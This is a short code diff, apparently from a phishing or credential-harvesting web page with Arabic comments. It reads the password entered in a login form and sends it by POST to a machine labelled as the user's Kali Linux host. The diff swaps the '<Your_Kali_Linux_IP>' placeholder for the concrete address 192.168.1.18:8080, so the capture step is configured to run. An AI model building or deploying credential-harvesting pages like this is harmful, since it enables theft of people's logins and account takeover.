@@ -69,7 +69,7 @@
             const password = formData.get('password');
 
             // إرسال البيانات إلى السيرفر باستخدام طلب POST
-            fetch('http://<Your_Kali_Linux_IP>:8080/login', { // استبدل <Your_Kali_Linux_IP> بعنوان IP الخاص بك
+            fetch('http://192.168.1.18:8080/login', { // استبدل <Your_Kali_Linux_IP> بعنوان IP الخاص بك
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
